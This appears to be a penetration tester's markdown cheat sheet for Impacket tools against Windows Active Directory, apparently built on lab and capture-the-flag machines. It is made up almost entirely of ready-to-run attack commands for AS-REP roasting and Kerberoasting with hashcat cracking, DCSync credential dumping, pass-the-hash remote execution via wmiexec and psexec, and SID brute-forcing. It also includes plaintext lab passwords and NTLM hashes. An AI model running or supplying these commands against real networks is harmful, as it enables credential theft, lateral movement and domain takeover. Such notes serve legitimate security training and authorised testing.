	#### Almost every Impacket scripts follows the same option syntax
```
authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME) based on target parameters.
                        If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use
                        the domain part (FQDN) specified in the target
                        parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will
                        use whatever was specified as target. This is useful
                        when target is the NetBIOS name and you cannot resolve
                        it
```

### Impacket GetNPUsers
Check if there are accounts with the "*Do not require Kerberos preauthentication*" enabled
`impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete`

Crack the retrieved hash: `sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

## Impacket GetUsersSPNs (Kerberoasting)
Retrieve Kerberoastable accounts `sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete` -> `sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
## Impacket Secretsdump (DCsync)
With valid credentials and right privileges the jeffadmin user can dump the dave user creds through DCsync attack
```bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```
### Impacket WMIExec
Connect as the local administrator with the NTML hash; SMB hash to be turned on. 
```bash
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

### Impacket LookUpSID
Check for known usernames on flight.htb domain
```
impacket-lookupsid flight.htb/svc_apache:"S@Ss!K@*t13"@flight.htb
```

#### Get TGT ticket
```
ntpdate frizzdc.frizz.htb    
impacket-getTGT frizz.htb/'f.frizzle':'Jenni_Luvs_Magic23' -dc-ip frizzdc.frizz.htb    
export KRB5CCNAME=f.frizzle.ccache  
ssh f.frizzle@frizz.htb -K
impacket-psexec -no-pass -k administrator@dc01.poseidon.yzx
```


```
# Performs various techniques to dump secrets from the remote machine without 
# executing any agent there. 

# For SAM and LSA Secrets (including cached creds) 
# we try to read as much as we can from the registry and then we save the hives 
# in the target system (%SYSTEMROOT%\Temp directory) and read the rest of the data 
# from there. 

# For DIT files, we dump NTLM hashes, Plaintext credentials (if available)
# and Kerberos keys using the DL_DRSGetNCChanges() method. It can also dump NTDS.dit 
# via vssadmin executed with the smbexec/wmiexec approach. The script initiates the 
# services required for its working if they are not available (e.g. 
# Remote Registry, even if it is disabled). 

# After the work is done, things are restored to the original state.

# Extract NTLM hashes with local files
secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL

# Remote extraction
secretsdump.py -just-dc-ntlm domain/user:password@IP
secretsdump.py -just-dc-ntlm domain/user:@IP-hashes LMHASH:NTHASH

```

#### SMB / MSRPC 
```
# A generic SMB client that will let you list shares and files, rename,
# upload and download files and create and delete directories
smbclient.py domain/user:password@IP
smbclient.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password

# This script will connect against a target (or list of targets) machine/s and gather 
# the OS architecture type installed by (ab)using a documented MSRPC feature.
getArch.py -target 10.10.2.2

# This script will dump the list of RPC endpoints and string bindings registered at the 
# target. It will also try to match them with a list of well known endpoints.
rpcdump.py domain/user:password@IP
rpcdump.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password

# This script will bind to the target's MGMT interface to get a list of interface IDs.
ifmap.py 10.10.20.1 135
ifmap.py 10.10.20.1 49154

# This binds to the given hostname:port and MSRPC interface.
# Then, it tries to call each of the first 256 operation numbers in turn
# and reports the outcome of each call
# Need to get interfaces, for example with ifmap.py
# usage: opdump.py hostname port interface version
opdump.py 10.10.1.1 135 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0

# An application that communicates with the Security Account Manager Remote interface
# from the MSRPC suite. It lists system user accounts, available resource shares 
# and other sensitive information exported through this service.
./samrdump.py SERVER/Administrator:T00r@192.168.1.140

# This script can be used to manipulate Windows services through the [MS-SCMR] MSRPC 
# Interface. It supports start, stop, delete, status, config, list, create and change.
services.py SERVER/Administrator:T00r@192.168.1.140 {start,stop,delete,status,config,list,create,change}

# Gets a list of the sessions opened at the remote hosts
netview.py domain/user:password -target 192.168.10.2
netview.py domain/user:password -target 192.168.10.2 -user Administrator

# Remote registry manipulation tool through the [MS-RRP] MSRPC Interface.
# The idea is to provide similar functionality as the REG.EXE Windows utility.
reg.py domain/user:password@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
reg.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password

# A Windows SID brute forcer example through [MS-LSAT] MSRPC Interface
# aiming at finding remote users/groups.
lookupsid.py domain/user:password@IP
lookupsid.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password

```

```
# This script will gather data about the domain's users and their corresponding email addresses.
GetADUsers.py domain/user:password@IP

# Simple MQTT example aimed at playing with different login options.
mqtt_check.py domain/user:password@IP
mqtt_check.py domain/user:password@IP -ssl

# [MS-RDPBCGR] and [MS-CREDSSP] partial implementation just to reach CredSSP auth.
# This example test whether an account is valid on the target host.
rdp_check.py domain/user:password@IP
rdp_check.py domain/user@IP -hashes LMHASH:NTHASH

# Simple packet sniffer that uses a raw socket to listen for packets 
# in transit corresponding to the specified protocols.
sniffer.py {tcp, udp, icmp}

# Simple ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host.
ping.py <src-ip> <dst-ip>

# Simple IPv6 ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host.
ping6.py <src-ip> <dst-ip>
```

## PSEXEC

Connect through empty LMHash and NTML hash
`python3 ./psexec.py itwk04admin@192.168.119.226 -hashes 00000000000000000000000000000000:445414c16b5689513d4ad8234391aacf`

### GetNPUsers